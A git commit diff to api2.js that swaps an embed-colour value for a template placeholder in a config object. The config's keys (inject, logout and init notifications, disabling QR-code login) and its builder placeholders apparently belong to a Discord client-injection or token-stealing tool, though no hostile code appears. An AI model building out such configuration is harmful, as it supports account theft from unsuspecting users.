8f4e09838eecd619b9789600dc09f77282fd915b
Lowki <98041497+Lowki1337@users.noreply.github.com>
2022-02-05 17:36:15 +0100

    Update api2.js

--- api2.js
+++ api2.js
@@ -13,7 +13,7 @@ const config = {
     "inject-notify": "%INJECTNOTI%1",
     "logout-notify": "%LOGOUTNOTI%1",
     "init-notify":"%INITNOTI%1",
-    "embed-color": "#12D500",
+    "embed-color": %MBEDCOLOR%1,
     "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
